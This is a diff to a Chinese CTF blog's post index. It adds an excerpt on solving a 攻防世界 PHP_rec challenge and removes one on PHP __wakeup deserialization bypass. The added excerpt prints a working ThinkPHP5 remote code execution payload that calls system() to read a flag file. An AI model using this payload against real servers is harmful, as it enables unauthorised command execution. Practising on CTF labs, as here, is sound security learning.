@@ -224,6 +224,45 @@
         <div class="row">
             <div class="col-md-8 col-md-offset-2 opening-statement">
                 <div class="col-md-4">
+                    <h3><a href="/2020/01/19/攻防世界高手进阶区PHP-rec/">攻防世界高手进阶区PHP_rec</a></h3>
+                    <span>
+                        <span class="post-meta">
+      <time datetime="2020-01-19T01:35:33.000Z" itemprop="datePublished">
+          2020-01-19
+      </time>
+    
+    
+    | 
+    <a href='/tags/WEB，php/'>WEB，php</a>
+    
+    
+</span>
+                    </span>
+                </div>
+                <div class="col-md-8">
+                    <p>
+                      
+                        php_rec进去以后F12看源码，什么都没发现。用御剑扫描一波没发现什么。就直接搜索thinkphp5 rce漏洞,改一改payload就出了。
+
+?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20../../../flag
+
+
+                      
+                    </p>
+                    
+                    <p class="pull-right readMore">
+                        <a href="/2020/01/19/攻防世界高手进阶区PHP-rec/">Read More...</a>
+                    </p>
+                    
+                </div>
+                <div class="clearfix"></div>
+                <hr class="nogutter">
+            </div>
+        </div>
+        
+        <div class="row">
+            <div class="col-md-8 col-md-offset-2 opening-statement">
+                <div class="col-md-4">
                     <h3><a href="/2020/01/16/Linux下安装UPX/">Linux下安装UPX</a></h3>
                     <span>
                         <span class="post-meta">
@@ -584,52 +623,6 @@ strstr() 函数搜索字符串在另一字符串中的第一次出现。注释�
                     
                     <p class="pull-right readMore">
                         <a href="/2019/12/28/攻防世界upload1总结/">Read More...</a>
-                    </p>
-                    
-                </div>
-                <div class="clearfix"></div>
-                <hr class="nogutter">
-            </div>
-        </div>
-        
-        <div class="row">
-            <div class="col-md-8 col-md-offset-2 opening-statement">
-                <div class="col-md-4">
-                    <h3><a href="/2019/12/25/wakeup漏洞绕过/">__wakeup漏洞绕过</a></h3>
-                    <span>
-                        <span class="post-meta">
-      <time datetime="2019-12-25T08:41:13.000Z" itemprop="datePublished">
-          2019-12-25
-      </time>
-    
-    
-    | 
-    <a href='/tags/WEB/'>WEB</a>,
-    
-    <a href='/tags/PHP/'>PHP</a>
-    
-    
-</span>
-                    </span>
-                </div>
-                <div class="col-md-8">
-                    <p>
-                      
-                        __wakeup()函数用法wakeup()是用在反序列化操作中。unserialize()会检查存在一个wakeup()方法。如果存在，则先会调用__wakeup()方法。
-&lt;?php
-class A{
-function __wakeup(){
-echo &#39;Hello&#39;;
-}
-}
-$c = new A();
-$d=unserialize(&#39;O:1:&quot;A&quot;:0:{}&#39;);
-?&g
-                      
-                    </p>
-                    
-                    <p class="pull-right readMore">
-                        <a href="/2019/12/25/wakeup漏洞绕过/">Read More...</a>
                     </p>
                     
                 </div>
